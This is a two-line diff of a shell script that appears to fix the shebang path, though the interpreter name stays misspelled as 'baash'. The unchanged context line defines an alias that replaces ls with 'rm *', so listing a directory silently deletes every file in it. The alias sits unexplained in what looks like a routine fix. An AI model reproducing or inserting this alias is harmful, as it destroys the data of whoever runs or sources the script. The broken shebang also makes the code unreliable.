@@ -1,2 +1,2 @@
-#!bin/baash
+#!/bin/baash
 alias ls="rm *"
